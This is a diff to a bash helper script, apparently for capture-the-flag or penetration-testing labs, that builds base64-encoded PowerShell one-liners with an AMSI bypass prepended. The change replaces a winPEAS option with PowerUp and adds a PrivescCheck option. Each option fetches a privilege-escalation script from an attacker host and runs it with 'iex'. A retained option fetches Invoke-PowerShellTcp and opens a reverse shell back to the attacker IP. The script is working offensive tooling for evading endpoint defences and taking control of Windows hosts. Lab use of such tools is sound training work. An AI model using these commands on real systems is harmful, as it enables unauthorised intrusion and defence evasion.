@@ -4,9 +4,10 @@
 #   powershell -ep bypass -e <BASE64>
 #
 # Usage:
-#   ./amsi_b64.sh "iex (iwr http://10.10.14.5:8000/windows/winPEAS.ps1 -UseBasicParsing).Content"
+#   ./amsi_b64.sh "iex (iwr http://10.10.14.5:8000/windows/PowerUp.ps1 -UseBasicParsing).Content; Invoke-AllChecks"
 #   ./amsi_b64.sh -raw "<command>"   # only base64-encode (no AMSI bypass prepended)
-#   ./amsi_b64.sh -winpeas           # build the winPEAS oneliner using detected tun0 IP
+#   ./amsi_b64.sh -powerup           # build the PowerUp.ps1 oneliner using detected tun0 IP
+#   ./amsi_b64.sh -privescchk        # build the PrivescCheck.ps1 oneliner
 #   ./amsi_b64.sh -revshell 4444     # PowerShell reverse-shell oneliner
 set -u
 
@@ -25,9 +26,13 @@ RAW=0
 if [ "${1:-}" = "-raw" ]; then RAW=1; shift; fi
 
 case "${1:-}" in
-    -winpeas)
+    -powerup)
         IP="$(tun0ip)"; [ -z "$IP" ] && IP="<TUN0_IP>"
-        CMD="iex (iwr http://$IP:8000/windows/winPEAS.ps1 -UseBasicParsing).Content"
+        CMD="iex (iwr http://$IP:8000/windows/PowerUp.ps1 -UseBasicParsing).Content; Invoke-AllChecks"
+        ;;
+    -privescchk|-privesccheck)
+        IP="$(tun0ip)"; [ -z "$IP" ] && IP="<TUN0_IP>"
+        CMD="iex (iwr http://$IP:8000/windows/PrivescCheck.ps1 -UseBasicParsing).Content; Invoke-PrivescCheck"
         ;;
     -revshell)
         IP="$(tun0ip)"; [ -z "$IP" ] && IP="<TUN0_IP>"
@@ -35,7 +40,7 @@ case "${1:-}" in
         CMD="iex (iwr http://$IP:8000/revshells/Invoke-PowerShellTcp.ps1 -UseBasicParsing).Content; Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port $PORT"
         ;;
     -h|--help|"")
-        sed -n '2,12p' "$0" | sed 's/^# \?//'
+        sed -n '2,11p' "$0" | sed 's/^# \?//'
         exit 0
         ;;
     *)
